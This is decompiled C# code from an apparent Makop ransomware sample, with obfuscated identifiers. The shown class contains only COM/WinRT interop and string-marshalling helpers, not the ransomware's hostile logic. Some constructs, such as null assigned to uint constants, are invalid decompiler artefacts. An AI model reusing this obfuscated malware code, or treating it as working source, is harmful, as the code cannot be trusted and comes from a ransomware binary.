// Decompiled with JetBrains decompiler
// Type: П吾伊吾ПП斯斯吾吾П吾伊伊УУУ斯П斯斯吾П.屁艾儿艾儿艾儿艾儿
// Assembly: 艾艾Й艾И尺И, Version=1.73.713.877, Culture=neutral, PublicKeyToken=null, ProcessorArchitecture=X86
// MVID: 5FD6AC6D-B7AF-4197-BB2E-5B6B7173B2EA
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-94658982002db6acea22c68b7619f71154933effd6428a81a235aba6e2789328.exe

using System;
using System.Collections.Generic;
using System.Collections.Generic.Internal;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace П吾伊吾ПП斯斯吾吾П吾伊伊УУУ斯П斯斯吾П
{
  public static class 屁艾儿艾儿艾儿艾儿
  {
    internal static int 马Х开艾吾艾艾吾吾马Х马Х马开艾开Х马Ц;
    private const uint 贼德迪儿艾迪迪艾儿吾儿德艾吾吾儿儿吾 = null;
    private const uint 吾尔尔吉尔尔尔吾О吾尔德德吉尔吉德吾吉吾弗吉德О吾吾 = null;

    public static void 杰艾贝吾吾杰贝杰杰艾() => 屁艾儿艾儿艾儿艾儿.马Х开艾吾艾艾吾吾马Х马Х马开艾开Х马Ц = Interop.MinCore.GetLastWin32Error();

    public static bool 迪哦哦哦哦迪哦哦哦哦哦哦伊马([In] ref Guid obj0, [In] ref Guid obj1) => InteropExtensions.GuidEquals(ref obj0, ref obj1);

    public static bool 丝德尺尺丝ДДД德尺德丝丝西尺丝诶诶丝尺Д丝Д丝丝Д德尺Д<\u002D>([In] \u002D obj0, [In] \u002D obj1) => InteropExtensions.ComparerEquals<\u002D>(obj0, obj1);

    public static \u002D 艾尺艾艾艾尺克艾艾克克艾艾艾艾艾<\u002D>() where \u002D : class => InteropExtensions.UncheckedCast<\u002D>(InteropExtensions.RuntimeNewObject(typeof (\u002D).TypeHandle));

    public static bool 艾艾德豆艾尔尔Э豆艾艾艾艾([In] object obj0) => InteropExtensions.IsEnum(InteropExtensions.GetTypeHandle(obj0));

    public static bool 克马德РППП马德马豆德П([In] Type obj0) => obj0.Equals(typeof (__ComObject)) || obj0.GetTypeInfo().IsSubclassOf(typeof (__ComObject));

    public static \u002D 开勒贝勒А勒А艾贝艾贝艾贝艾勒贝勒开А<\u002D>([In] object obj0) where \u002D : class => InteropExtensions.UncheckedCast<\u002D>(obj0);

    public static double 艾Ч吾吉吾吾艾吉吾Ч艾艾吉РЧР艾艾Р艾吾Р吾Р([In] DateTime obj0) => InteropExtensions.ToNativeOleDate(obj0);

    public static DateTime 斯Г斯斯弗Г艾Г弗弗艾吾吾勒勒吾勒勒([In] double obj0) => InteropExtensions.FromNativeOleDate(obj0);

    public static void 吾Ш屁贝Т屁ТТ贝Т儿ШТ儿Т儿贝儿Т贝吾吾吾屁屁屁([In] SafeHandle obj0, [In] IntPtr obj1) => InteropExtensions.InitializeHandle(obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static bool 尺尺艾艾维维尔伊维马艾维([In] object obj0, [In] RuntimeTypeHandle obj1) => InteropExtensions.IsOfType(obj0, obj1);

    public static void 尺尺维维比尺维维艾维维艾艾维德维比([In] Exception obj0, [In] int obj1) => InteropExtensions.SetExceptionErrorCode(obj0, obj1);

    public static Type 艾尺弗艾弗艾艾([In] HSTRING obj0, [In] int obj1) => throw new NotSupportedException("艾儿儿贼艾杰贼儿艾艾儿儿杰儿儿贼杰艾贼艾杰杰艾杰贼");

    public static void 艾维丝尔维维艾维尔尔勒艾勒丝丝([In] Type obj0, [In] ref HSTRING obj1, [In] ref int obj2) => throw new NotSupportedException("丝丝西艾西丝西屁西艾西西西屁艾屁西艾丝西马屁艾丝西马");

    [CLSCompliant(false)]
    public static unsafe void 丝吾贝维吾维维吾吾维丝维贝吉丝吉维丝丝丝丝吾丝吾吾吉丝([In] StringBuilder obj0, [In] ushort* obj1) => InteropExtensions.UnsafeCopyTo(obj0, (char*) obj1);

    [CLSCompliant(false)]
    public static unsafe void 艾吾ССС吾吾吾Е艾艾艾艾Е艾([In] ushort* obj0, [In] StringBuilder obj1) => InteropExtensions.ReplaceBuffer(obj1, (char*) obj0);

    [CLSCompliant(false)]
    public static unsafe void 尺尺开勒艾开尺比比尺Р尺勒比勒Р开Р(
      [In] StringBuilder obj0,
      [In] byte* obj1,
      [In] bool obj2,
      [In] bool obj3)
    {
      int num;
      char[] buffer = InteropExtensions.GetBuffer(obj0, ref num);
      if (buffer != null)
      {
        fixed (char* chPtr = buffer)
          屁艾儿艾儿艾儿艾儿.尺尺艾Г艾吉艾Г尺艾吾Г吾吾尺吉(chPtr, num, obj1, true, obj2, obj3);
      }
      else
      {
        string str = obj0.ToString();
        fixed (char* chPtr = str)
          屁艾儿艾儿艾儿艾儿.尺尺艾Г艾吉艾Г尺艾吾Г吾吾尺吉(chPtr, str.Length, obj1, true, obj2, obj3);
      }
    }

    [CLSCompliant(false)]
    public static unsafe void П维П维吾迪丝П吾丝迪迪吾([In] byte* obj0, [In] StringBuilder obj1)
    {
      if ((IntPtr) obj0 == IntPtr.Zero)
        throw new ArgumentNullException();
      int num;
      int length;
      屁艾儿艾儿艾儿艾儿.吾德德艾艾吾艾德德杰尔艾尔德艾杰德吾德吾尔尔吾杰德艾尔德(obj0, ref num, ref length);
      if (length > 0)
      {
        char[] chArray = new char[length];
        fixed (char* chPtr = chArray)
        {
          Interop.CoreString.MultiByteToWideChar(0U, 0U, new IntPtr((void*) obj0), num, new IntPtr((void*) chPtr), length);
          InteropExtensions.ReplaceBuffer(obj1, chArray);
        }
      }
      else
        obj1.Clear();
    }

    [CLSCompliant(false)]
    public static unsafe string 迪儿贼贼儿儿儿艾Ф迪艾儿贼艾迪艾艾儿儿儿儿艾贼迪艾迪([In] byte* obj0)
    {
      if ((IntPtr) obj0 == IntPtr.Zero)
        return (string) null;
      int num;
      int count;
      屁艾儿艾儿艾儿艾儿.吾德德艾艾吾艾德德杰尔艾尔德艾杰德吾德吾尔尔吾杰德艾尔德(obj0, ref num, ref count);
      string str = string.Empty;
      if (count > 0)
      {
        str = new string(' ', count);
        fixed (char* chPtr = str)
          Interop.CoreString.MultiByteToWideChar(0U, 0U, new IntPtr((void*) obj0), num, new IntPtr((void*) chPtr), count);
      }
      return str;
    }

    [CLSCompliant(false)]
    public static unsafe byte* 斯斯弗斯斯娜弗弗弗勒艾吉弗弗斯弗勒艾艾吉娜娜([In] string obj0, [In] bool obj1, [In] bool obj2)
    {
      if (obj0 == null)
        return (byte*) null;
      int length = obj0.Length;
      fixed (char* chPtr = obj0)
        return 屁艾儿艾儿艾儿艾儿.尺尺艾Г艾吉艾Г尺艾吾Г吾吾尺吉(chPtr, length, (byte*) null, true, obj1, obj2);
    }

    [CLSCompliant(false)]
    public static unsafe void 豆М艾西ММ维维西([In] char[] obj0, [In] byte* obj1, [In] int obj2, [In] bool obj3, [In] bool obj4)
    {
      if (obj0 == null)
      {
        for (int index = 0; index < obj2; ++index)
          obj1[index] = (byte) 0;
      }
      int length = obj0.Length;
      if (length < obj2)
        throw new ArgumentException(SR.WrongSizeArrayInNStruct);
      fixed (char* chPtr = obj0)
        屁艾儿艾儿艾儿艾儿.尺尺艾Г艾吉艾Г尺艾吾Г吾吾尺吉(chPtr, length, obj1, false, obj3, obj4);
    }

    [CLSCompliant(false)]
    public static unsafe void 伊斯弗伊斯弗斯Ы斯伊弗Т伊伊勒勒弗Ы([In] byte* obj0, [In] char[] obj1)
    {
      int length = obj1.Length;
      fixed (char* chPtr = obj1)
        Interop.CoreString.MultiByteToWideChar(0U, 0U, new IntPtr((void*) obj0), length, new IntPtr((void*) chPtr), length);
    }

    [CLSCompliant(false)]
    public static unsafe void 丝艾杰杰尺艾丝丝([In] char[] obj0, [In] byte* obj1, [In] bool obj2, [In] bool obj3)
    {
      if (obj0 == null)
        return;
      if ((IntPtr) obj1 == IntPtr.Zero)
        throw new ArgumentNullException();
      int length = obj0.Length;
      fixed (char* chPtr = obj0)
        屁艾儿艾儿艾儿艾儿.尺尺艾Г艾吉艾Г尺艾吾Г吾吾尺吉(chPtr, length, obj1, false, obj2, obj3);
    }

    [CLSCompliant(false)]
    public static unsafe void 提吾提吾吾吾迪迪吾尺([In] byte* obj0, [In] char[] obj1)
    {
      if ((IntPtr) obj0 == IntPtr.Zero)
        return;
      int num = obj1 != null ? obj1.Length : throw new ArgumentNullException();
      fixed (char* chPtr = obj1)
        Interop.CoreString.MultiByteToWideChar(0U, 0U, new IntPtr((void*) obj0), num, new IntPtr((void*) chPtr), num);
    }

    public static unsafe byte 艾艾迪艾艾斯ЕЕ迪迪艾艾西斯艾Е([In] char obj0, [In] bool obj1, [In] bool obj2)
    {
      byte* numPtr = 屁艾儿艾儿艾儿艾儿.尺尺艾Г艾吉艾Г尺艾吾Г吾吾尺吉(&obj0, 1, (byte*) null, false, obj1, obj2);
      byte num = *numPtr;
      Interop.COM.CoTaskMemFree(new IntPtr((void*) numPtr));
      return num;
    }

    public static unsafe char 尺屁伊诶尺诶马尺伊马马诶马诶屁马([In] byte obj0)
    {
      char[] chArray;
      fixed (char* chPtr = chArray = new char[1])
      {
        Interop.CoreString.MultiByteToWideChar(0U, 0U, new IntPtr((void*) &obj0), 1, new IntPtr((void*) chPtr), 1);
        return chArray[0];
      }
    }

    [CLSCompliant(false)]
    public static unsafe void 吉艾艾艾艾ЗЗ艾豆艾艾艾З吉艾吉ЗЗ艾З艾豆艾豆ЗЗ豆(
      [In] string obj0,
      [In] byte* obj1,
      [In] int obj2,
      [In] bool obj3,
      [In] bool obj4)
    {
      if ((IntPtr) obj1 == IntPtr.Zero)
        throw new ArgumentNullException();
      if (obj0 != null)
      {
        int num = obj0.Length;
        if (num >= obj2)
          num = obj2 - 1;
        fixed (char* chPtr = obj0)
          屁艾儿艾儿艾儿艾儿.尺尺艾Г艾吉艾Г尺艾吾Г吾吾尺吉(chPtr, num, obj1, true, obj3, obj4);
      }
      else
        *obj1 = (byte) 0;
    }

    [CLSCompliant(false)]
    public static unsafe string 斯伊斯伊斯斯斯伊马吉斯提伊提([In] byte* obj0, [In] int obj1)
    {
      if (obj1 == 0)
        throw new MarshalDirectiveException();
      int num1 = 屁艾儿艾儿艾儿艾儿.丝艾Е弗Д丝艾艾Е艾Д弗ЕЕ艾弗弗弗艾艾Е艾艾丝艾(obj0);
      int num2 = obj1;
      string str = string.Empty;
      if (num2 > 0)
      {
        char* chPtr = stackalloc char[num2];
        int wideChar = Interop.CoreString.MultiByteToWideChar(0U, 0U, new IntPtr((void*) obj0), num1, new IntPtr((void*) chPtr), num2);
        if (wideChar > 0)
          str = new string(chPtr, 0, wideChar);
      }
      return str;
    }

    private static unsafe int 丝艾Е弗Д丝艾艾Е艾Д弗ЕЕ艾弗弗弗艾艾Е艾艾丝艾([In] byte* obj0)
    {
      byte* numPtr = obj0;
      while (*obj0 != (byte) 0)
        ++obj0;
      return (int) (obj0 - numPtr);
    }

    private static unsafe byte* 尺尺艾Г艾吉艾Г尺艾吾Г吾吾尺吉(
      [In] char* obj0,
      [In] int obj1,
      [In] byte* obj2,
      [In] bool obj3,
      [In] bool obj4,
      [In] bool obj5)
    {
      bool flag = true;
      for (int index = 0; index < obj1; ++index)
      {
        if (obj0[index] >= '\u0080')
        {
          flag = false;
          break;
        }
      }
      int index1 = !flag ? Interop.CoreString.WideCharToMultiByte(0U, 1024U, obj0, obj1, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero) : obj1;
      if ((IntPtr) obj2 == IntPtr.Zero)
        obj2 = (byte*) (void*) Interop.COM.CoTaskMemAlloc((IntPtr) (index1 + 1));
      if ((IntPtr) obj2 == IntPtr.Zero)
        return (byte*) null;
      if (flag)
      {
        byte* numPtr = obj2;
        char* chPtr = obj0;
        for (; obj1 > 0; --obj1)
          *numPtr++ = (byte) *chPtr++;
      }
      else
      {
        uint num1 = obj4 ? 0U : 1024U;
        uint num2 = 0;
        Interop.CoreString.WideCharToMultiByte(0U, num1, obj0, obj1, new IntPtr((void*) obj2), index1, IntPtr.Zero, obj5 ? new IntPtr((void*) &num2) : IntPtr.Zero);
        if (num2 != 0U)
          throw new ArgumentException(SR.Arg_InteropMarshalUnmappableChar);
      }
      if (obj3)
        obj2[index1] = (byte) 0;
      return obj2;
    }

    private static unsafe bool 吾德德艾艾吾艾德德杰尔艾尔德艾杰德吾德吾尔尔吾杰德艾尔德([In] byte* obj0, [In] ref int obj1, [In] ref int obj2)
    {
      obj1 = 0;
      bool flag = true;
      byte* numPtr1 = obj0;
      byte* numPtr2 = numPtr1 + 1;
      for (byte index = *numPtr1; index != (byte) 0; index = *numPtr2++)
      {
        if (index >= (byte) 128)
          flag = false;
        ++obj1;
      }
      string empty = string.Empty;
      obj2 = !flag ? Interop.CoreString.MultiByteToWideChar(0U, 0U, new IntPtr((void*) obj0), obj1, IntPtr.Zero, 0) : obj1;
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static unsafe void 西ШШ迪马马迪迪Ш伊迪马ШШ伊ШШ西(
      [In] char* obj0,
      [In] string obj1,
      [In] HSTRING_HEADER* obj2,
      [In] HSTRING* obj3)
    {
      if (obj1 == null)
        throw new ArgumentNullException(SR.Null_HString);
      int stringReference = ExternalInterop.WindowsCreateStringReference(obj0, obj1.Length, obj2, (void**) obj3);
      if (stringReference < 0)
        throw Marshal.GetExceptionForHR(stringReference);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static HSTRING 开克屁开屁屁克开Щ([In] string obj0) => obj0 != null ? 屁艾儿艾儿艾儿艾儿.伊屁О屁ЖЖЖ伊Ж屁Ж(obj0) : throw new ArgumentNullException(SR.Null_HString);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static HSTRING 儿儿豆豆艾豆艾艾儿儿豆艾艾艾伊豆伊艾艾儿伊艾艾艾艾艾豆艾儿([In] string obj0) => obj0 != null ? 屁艾儿艾儿艾儿艾儿.伊屁О屁ЖЖЖ伊Ж屁Ж(obj0) : throw new MarshalDirectiveException(SR.BadMarshalField_Null_HString);

    private static unsafe HSTRING 伊屁О屁ЖЖЖ伊Ж屁Ж([In] string obj0)
    {
      HSTRING hstring;
      int errorCode = 屁艾儿艾儿艾儿艾儿.艾艾艾吾艾儿儿艾Ю吾屁尔尔尔ЮЮ吾尔Ю(obj0, &hstring);
      if (errorCode < 0)
        throw Marshal.GetExceptionForHR(errorCode);
      return hstring;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static unsafe int 艾艾艾吾艾儿儿艾Ю吾屁尔尔尔ЮЮ吾尔Ю([In] string obj0, [In] HSTRING* obj1)
    {
      fixed (char* chPtr = obj0)
        return Interop.WinRT.WindowsCreateString(chPtr, (uint) obj0.Length, (void*) obj1);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static string 马西尺西尺西西Б尺尺Б尔Б([In] IntPtr obj0) => 屁艾儿艾儿艾儿艾儿.德艾艾Х艾诶艾德ХХ德Х(new HSTRING(obj0));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static unsafe string 德艾艾Х艾诶艾德ХХ德Х([In] HSTRING obj0)
    {
      if (obj0.handle == IntPtr.Zero)
        return string.Empty;
      uint length = 0;
      return new string(ExternalInterop.WindowsGetStringRawBuffer(obj0.handle.ToPointer(), &length), 0, (int) length);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static unsafe void 勒迪艾迪勒吉艾迪迪艾丝艾勒艾迪吉艾勒丝艾勒丝([In] IntPtr obj0) => ExternalInterop.WindowsDeleteString(obj0.ToPointer());

    [CLSCompliant(false)]
    public static int 吉提吉Н艾弗吉西弗([In] __ComObject obj0) => obj0.AddRef();

    [CLSCompliant(false)]
    public static int 斯艾艾维维斯艾屁艾屁屁斯屁艾勒艾维艾艾勒维勒维维([In] __ComObject obj0) => obj0.Release();

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static unsafe int 斯Х屁屁О斯斯ХХ提提屁Х屁屁提斯ОИ斯提ХО屁Х([In] IntPtr obj0) => CalliIntrinsics.StdCall__AddRef(((__com_IUnknown*) (void*) obj0)->pVtable->pfnAddRef, obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static unsafe int 吾ДД吾吾Ц吾Ц吾吾吾Ц吾尔ДЦД吾吾吾吾Д([In] IntPtr obj0) => CalliIntrinsics.StdCall__Release(((__com_IUnknown*) (void*) obj0)->pVtable->pfnRelease, obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static unsafe int 尔尔艾艾吾吾尔艾杰艾М艾艾吾艾([In] IntPtr obj0) => ((__com_IUnknown*) (void*) obj0)->pVtable->pfnRelease == AddrOfIntrinsics.AddrOf<AddrOfRelease>(new AddrOfRelease((object) null, __methodptr(Release))) ? __interface_ccw.DirectRelease(obj0) : 屁艾儿艾儿艾儿艾儿.吾ДД吾吾Ц吾Ц吾吾吾Ц吾尔ДЦД吾吾吾吾Д(obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static int 艾艾丝儿丝儿丝艾丝艾儿丝贼艾克克丝克Х贼丝克贼([In] IntPtr obj0) => obj0 != IntPtr.Zero ? 屁艾儿艾儿艾儿艾儿.尔尔艾艾吾吾尔艾杰艾М艾艾吾艾(obj0) : 0;

    [CLSCompliant(false)]
    public static __ComObject 西西吉吉西斯勒斯斯Э勒勒Э勒勒勒ЭЭЭ西([In] string obj0, [In] McgTypeInfo obj1) => FactoryCache.Get().GetActivationFactory(obj0, obj1, false);

    public static object 开诶西诶艾艾Ц艾西开ЦЦ开西艾诶西Ц西艾([In] IntPtr obj0) => ComCallableObject.GetTarget(obj0);

    [CLSCompliant(false)]
    public static object 伊伊伊维维伊М维伊维伊维儿伊М儿伊М儿伊М伊维伊М([In] IntPtr obj0, [In] McgTypeInfo obj1) => 屁艾儿艾儿艾儿艾儿.维ГК吉ЕКЕ吉维维Г吉贼КЕ贼ЕГГ贼ГК吉(obj0, obj1, new McgClassInfo());

    [CLSCompliant(false)]
    public static object 尔尔儿伊艾艾儿儿尔艾艾尔尔艾尔艾艾伊艾艾儿伊艾([In] IntPtr obj0, [In] McgTypeInfo obj1) => McgComHelpers.ComInterfaceToObjectInternal(obj0, obj1, new McgClassInfo(), (McgComHelpers.CreateComObjectFlags) 2);

    [CLSCompliant(false)]
    public static object 维ГК吉ЕКЕ吉维维Г吉贼КЕ贼ЕГГ贼ГК吉([In] IntPtr obj0, [In] McgTypeInfo obj1, [In] McgClassInfo obj2)
    {
      object objectInternal = McgComHelpers.ComInterfaceToObjectInternal(obj0, obj1, obj2, (McgComHelpers.CreateComObjectFlags) 0);
      if (!((McgClassInfo) ref obj2).IsNull && objectInternal != null && !InteropExtensions.IsInstanceOfClass(objectInternal, ((McgClassInfo) ref obj2).ClassType))
        throw new InvalidCastException();
      return objectInternal;
    }

    public static IntPtr 提艾提艾吉维Ю艾吉艾提Ю吉([In] IntPtr obj0, [In] ref Guid obj1)
    {
      int num = 0;
      return 屁艾儿艾儿艾儿艾儿.ЫЫЙ弗艾Ы艾开艾艾Ы开开Й弗Ы弗艾艾弗(obj0, ref obj1, ref num);
    }

    public static IntPtr ЫЫЙ弗艾Ы艾开艾艾Ы开开Й弗Ы弗艾艾弗([In] IntPtr obj0, [In] ref Guid obj1, [In] ref int obj2)
    {
      IntPtr num;
      obj2 = 屁艾儿艾儿艾儿艾儿.迪迪迪迪开伊迪伊迪艾开迪儿艾伊艾伊儿迪迪儿艾伊伊迪伊开儿(obj0, ref obj1, ref num);
      return num;
    }

    internal static unsafe int 迪迪迪迪开伊迪伊迪艾开迪儿艾伊艾伊儿迪迪儿艾伊伊迪伊开儿(
      [In] IntPtr obj0,
      [In] ref Guid obj1,
      [In] ref IntPtr obj2)
    {
      fixed (Guid* guidPtr = &obj1)
      {
        IntPtr num1;
        int num2 = CalliIntrinsics.StdCall__int(((__com_IUnknown*) (void*) obj0)->pVtable->pfnQueryInterface, obj0, (void*) guidPtr, (void*) &num1);
        if (num2 != 0)
        {
          obj2 = new IntPtr();
          return num2;
        }
        obj2 = num1;
        return num2;
      }
    }

    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    public static IntPtr 贝吾贝贝贝К贝贝К维贝贝КК吾艾([In] object obj0) => 屁艾儿艾儿艾儿艾儿.克克娜维维吉娜娜娜娜吉维吉维维娜娜娜克吉娜(obj0, McgModuleManager.IInspectable);

    [CLSCompliant(false)]
    public static IntPtr 克克娜维维吉娜娜娜娜吉维吉维维娜娜娜克吉娜([In] object obj0, [In] McgTypeInfo obj1) => McgComHelpers.ObjectToComInterfaceInternal(obj0, obj1);

    [CLSCompliant(false)]
    public static IntPtr 贼贼吾艾贼吉贼贼吾吾Й吾Й贼吉贼贼吾吉贼Й吾Й艾吉贼贼贼([In] __ComObject obj0)
    {
      ComCallableObject comCallableObject = (ComCallableObject) null;
      try
      {
        comCallableObject = new ComCallableObject((object) obj0, obj0);
        return comCallableObject.GetComInterfaceForTypeInfo_NoCheck(McgModuleManager.IInspectable);
      }
      finally
      {
        comCallableObject?.Release();
      }
    }

    [CLSCompliant(false)]
    public static IntPtr 艾吉克С吉吉С克艾З艾艾СС艾СС艾СССККЗ艾СС([In] object obj0, [In] McgTypeInfo obj1) => McgComHelpers.ManagedObjectToComInterface(obj0, obj1);

    public static object 诶哦尔哦诶Ы豆О尔豆诶尔尔Ы诶哦尔哦尔О诶尔诶诶О尔豆([In] IntPtr obj0) => 屁艾儿艾儿艾儿艾儿.维ГК吉ЕКЕ吉维维Г吉贼КЕ贼ЕГГ贼ГК吉(obj0, McgModuleManager.IInspectable, new McgClassInfo());

    public static unsafe IntPtr Ш艾吉Ш艾斯德Ш吉吉德德吉艾德艾Ш([In] Guid obj0)
    {
      Interop.COM.MULTI_QI multiQi;
      IntPtr num1 = new IntPtr((void*) &multiQi);
      fixed (Guid* guidPtr1 = &Interop.COM.IID_IUnknown)
      {
        Guid* guidPtr2 = &obj0;
        multiQi.pIID = new IntPtr((void*) guidPtr1);
        multiQi.pItf = IntPtr.Zero;
        multiQi.hr = 0;
        IntPtr zero1 = IntPtr.Zero;
        IntPtr zero2 = IntPtr.Zero;
        IntPtr num2 = num1;
        int instanceFromApp = Interop.COM.CoCreateInstanceFromApp(guidPtr2, zero1, 21, zero2, 1, num2);
        if (instanceFromApp < 0)
          throw 屁艾儿艾儿艾儿艾儿.К尺К勒К艾尺艾К艾艾勒艾伊艾伊(instanceFromApp, false);
        return multiQi.hr >= 0 ? multiQi.pItf : throw 屁艾儿艾儿艾儿艾儿.К尺К勒К艾尺艾К艾艾勒艾伊艾伊(multiQi.hr, false);
      }
    }

    public static void 艾吾吾艾贼艾吉吾() => ContextEntry.RemoveCurrentContext();

    public static int 艾艾艾艾吾吾尺马马艾艾艾吾尺艾艾吾吾艾吾马艾() => ((DictionaryBase) ComObjectCache.s_comObjectMap).Count;

    public static IEnumerable<__ComObject> 吾艾提提吾娜艾吾艾提艾伊吾娜伊提提豆艾艾豆伊娜艾伊豆豆豆豆()
    {
      List<__ComObject> comObjectList = new List<__ComObject>();
      for (int index = 0; index < ComObjectCache.s_comObjectMap.GetMaxCount(); ++index)
      {
        IntPtr num = new IntPtr();
        if (ComObjectCache.s_comObjectMap.GetValue(index, ref num) && num != IntPtr.Zero)
        {
          GCHandle gcHandle = GCHandle.FromIntPtr(num);
          comObjectList.Add(InteropExtensions.UncheckedCast<__ComObject>(gcHandle.Target));
        }
      }
      return (IEnumerable<__ComObject>) comObjectList;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static int 维勒杰勒杰德勒勒德开勒维德杰开德维哦哦哦维杰勒([In] Exception obj0) => Marshal.GetHRForException(obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static int 迪比迪艾伊伊比艾艾比艾艾屁屁迪迪艾艾屁比伊迪([In] Exception obj0) => obj0.HResult;

    public static Exception К尺К勒К艾尺艾К艾艾勒艾伊艾伊([In] int obj0, [In] bool obj1) => Marshal.GetExceptionForHR(obj0);
  }
}
